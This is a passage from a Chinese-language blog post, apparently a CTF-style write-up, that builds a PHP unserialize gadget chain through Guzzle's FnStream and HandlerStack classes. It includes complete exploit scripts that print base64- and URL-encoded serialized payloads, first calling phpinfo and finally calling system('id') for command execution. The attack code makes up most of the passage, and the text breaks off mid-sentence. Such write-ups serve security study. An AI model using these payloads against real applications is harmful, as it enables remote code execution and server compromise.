</span><br><span class=\"line\">  \t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;_fn_close)) &#123;</span><br><span class=\"line\">          <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;_fn_close);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  \t</span><br><span class=\"line\"><span class=\"comment\">// 略</span></span><br><span class=\"line\">  \t</span><br><span class=\"line\">  \t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">close</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;_fn_close);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 略</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>這個應該是最簡單可以觸發的地方了</li>\n<li><code>__destruct()</code> function 會在物件被刪除的時候執行</li>\n<li>如果要構造一個執行 <code>phpinfo()</code> 的 chain 已經足夠了</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">GuzzleHttp</span>\\<span class=\"title class_\">Psr7</span> &#123;</span><br><span class=\"line\"><span class=\"title class_\">class</span> <span class=\"title class_\">FnStream</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    /** @<span class=\"title class_\">var</span> <span class=\"title class_\">array</span> */</span><br><span class=\"line\">    <span class=\"title class_\">private</span> $<span class=\"title class_\">methods</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> array Methods that must be implemented in the given array */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">static</span> <span class=\"variable\">$slots</span> = [<span class=\"string\">&#x27;__toString&#x27;</span>, <span class=\"string\">&#x27;close&#x27;</span>, <span class=\"string\">&#x27;detach&#x27;</span>, <span class=\"string\">&#x27;rewind&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;getSize&#x27;</span>, <span class=\"string\">&#x27;tell&#x27;</span>, <span class=\"string\">&#x27;eof&#x27;</span>, <span class=\"string\">&#x27;isSeekable&#x27;</span>, <span class=\"string\">&#x27;seek&#x27;</span>, <span class=\"string\">&#x27;isWritable&#x27;</span>, <span class=\"string\">&#x27;write&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;isReadable&#x27;</span>, <span class=\"string\">&#x27;read&#x27;</span>, <span class=\"string\">&#x27;getContents&#x27;</span>, <span class=\"string\">&#x27;getMetadata&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $methods Hash of method name to a callable.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"keyword\">array</span> <span class=\"variable\">$methods</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;methods = <span class=\"variable\">$methods</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Create the functions on the class</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$methods</span> <span class=\"keyword\">as</span> <span class=\"variable\">$name</span> =&gt; <span class=\"variable\">$fn</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"string\">&#x27;_fn_&#x27;</span> . <span class=\"variable\">$name</span>&#125; = <span class=\"variable\">$fn</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * The close method is called on the underlying stream only if possible.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;_fn_close)) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;_fn_close);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">close</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;_fn_close);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">exploit</span> &#123;</span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">GuzzleHttp</span>\\<span class=\"title class_\">Psr7</span>\\<span class=\"title class_\">FnStream</span>;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">FnStream</span>([<span class=\"string\">&quot;close&quot;</span>=&gt; <span class=\"string\">&quot;phpinfo&quot;</span>]);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果要執行任意命令的話這樣還不夠，稍微參考一下 php document 可以發現說 <code>call_user_func</code> 是可以給 array 的</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Foobar</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Foo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">static</span> <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">&quot;Hello world!\\n&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"keyword\">__NAMESPACE__</span> .<span class=\"string\">&#x27;\\Foo::test&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"keyword\">array</span>(<span class=\"keyword\">__NAMESPACE__</span> .<span class=\"string\">&#x27;\\Foo&#x27;</span>, <span class=\"string\">&#x27;test&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><a href=\"https://www.php.net/manual/zh/function.call-user-func.php\" target=\"_blank\">https://www.php.net/manual/zh/function.call-user-func.php</a></li>\n<li>可以簡單的理解為如果今天 array 第一個位置是 class，第二個位置就會是呼叫那個 class 下面的 function（如果我沒有理解錯的話 w</li>\n<li>因此需要找另外一個 class 可以幫助執行任意指令</li>\n<li>在 <code>/var/www/html/vendor/guzzlehttp/guzzle/src/HandlerStack.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">GuzzleHttp</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Psr</span>\\<span class=\"title\">Http</span>\\<span class=\"title\">Message</span>\\<span class=\"title\">RequestInterface</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Creates a composed Guzzle handler function by stacking middlewares on top of</span></span><br><span class=\"line\"><span class=\"comment\"> * an HTTP handler function.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HandlerStack</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> callable */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$handler</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> array */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$stack</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> callable|null */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cached</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 略</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> callable $handler Underlying HTTP handler.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"keyword\">callable</span> <span class=\"variable\">$handler</span> = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handler = <span class=\"variable\">$handler</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 略</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Compose the middleware and handler into a single callable function.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> callable</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable language_\">$this</span>-&gt;cached) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!(<span class=\"variable\">$prev</span> = <span class=\"variable language_\">$this</span>-&gt;handler)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">\\LogicException</span>(<span class=\"string\">&#x27;No handler has been specified&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"title function_ invoke__\">array_reverse</span>(<span class=\"variable\">$this</span>-&gt;stack) <span class=\"keyword\">as</span> <span class=\"variable\">$fn</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$prev</span> = <span class=\"variable\">$fn</span>[<span class=\"number\">0</span>](<span class=\"variable\">$prev</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;cached = <span class=\"variable\">$prev</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;cached;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  \t</span><br><span class=\"line\"><span class=\"comment\">// 略</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到在 <code>resolve()</code> 存在一個很有趣的地方 <code>$prev = $fn[0]($prev);</code> 所有的地方都可以控\n<ul>\n<li><code>$fn[0] -&gt; system</code></li>\n<li><code>($prev) -&gt; (&quot;id&quot;)</code></li>\n</ul>\n</li>\n<li>至此所有拼圖都有了，接下來把他們全部都拼在一起就可以了</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// script.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">GuzzleHttp</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">class</span> <span class=\"title class_\">HandlerStack</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    /** @<span class=\"title class_\">var</span> <span class=\"title class_\">callable</span> */</span><br><span class=\"line\">    <span class=\"title class_\">private</span> $<span class=\"title class_\">handler</span> = &quot;<span class=\"title class_\">id</span>&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> array */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$stack</span> = [[<span class=\"string\">&quot;system&quot;</span>]];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> callable|null */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cached</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> callable $handler Underlying HTTP handler.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"keyword\">callable</span> <span class=\"variable\">$handler</span> = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handler = <span class=\"string\">&quot;id&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Compose the middleware and handler into a single callable function.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> callable</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable language_\">$this</span>-&gt;cached) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!(<span class=\"variable\">$prev</span> = <span class=\"variable language_\">$this</span>-&gt;handler)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">\\LogicException</span>(<span class=\"string\">&#x27;No handler has been specified&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"title function_ invoke__\">array_reverse</span>(<span class=\"variable\">$this</span>-&gt;stack) <span class=\"keyword\">as</span> <span class=\"variable\">$fn</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$prev</span> = <span class=\"variable\">$fn</span>[<span class=\"number\">0</span>](<span class=\"variable\">$prev</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;cached = <span class=\"variable\">$prev</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;cached;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">GuzzleHttp</span>\\<span class=\"title class_\">Psr7</span> &#123;</span><br><span class=\"line\"><span class=\"title class_\">class</span> <span class=\"title class_\">FnStream</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    /** @<span class=\"title class_\">var</span> <span class=\"title class_\">array</span> */</span><br><span class=\"line\">    <span class=\"title class_\">private</span> $<span class=\"title class_\">methods</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** <span class=\"doctag\">@var</span> array Methods that must be implemented in the given array */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"built_in\">static</span> <span class=\"variable\">$slots</span> = [<span class=\"string\">&#x27;__toString&#x27;</span>, <span class=\"string\">&#x27;close&#x27;</span>, <span class=\"string\">&#x27;detach&#x27;</span>, <span class=\"string\">&#x27;rewind&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;getSize&#x27;</span>, <span class=\"string\">&#x27;tell&#x27;</span>, <span class=\"string\">&#x27;eof&#x27;</span>, <span class=\"string\">&#x27;isSeekable&#x27;</span>, <span class=\"string\">&#x27;seek&#x27;</span>, <span class=\"string\">&#x27;isWritable&#x27;</span>, <span class=\"string\">&#x27;write&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;isReadable&#x27;</span>, <span class=\"string\">&#x27;read&#x27;</span>, <span class=\"string\">&#x27;getContents&#x27;</span>, <span class=\"string\">&#x27;getMetadata&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $methods Hash of method name to a callable.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"keyword\">array</span> <span class=\"variable\">$methods</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;methods = <span class=\"variable\">$methods</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Create the functions on the class</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$methods</span> <span class=\"keyword\">as</span> <span class=\"variable\">$name</span> =&gt; <span class=\"variable\">$fn</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"string\">&#x27;_fn_&#x27;</span> . <span class=\"variable\">$name</span>&#125; = <span class=\"variable\">$fn</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * The close method is called on the underlying stream only if possible.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;_fn_close)) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;_fn_close);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">close</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;_fn_close);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">exploit</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title class_\">use</span> <span class=\"title class_\">GuzzleHttp</span>\\<span class=\"title class_\">HandlerStack</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">GuzzleHttp</span>\\<span class=\"title\">Psr7</span>\\<span class=\"title\">FnStream</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">HandlerStack</span>();</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">FnStream</span>([<span class=\"string\">&quot;close&quot;</span> =&gt; [<span class=\"variable\">$b</span>, <span class=\"string\">&quot;resolve&quot;</span>]]);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>)));</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>會產出一個 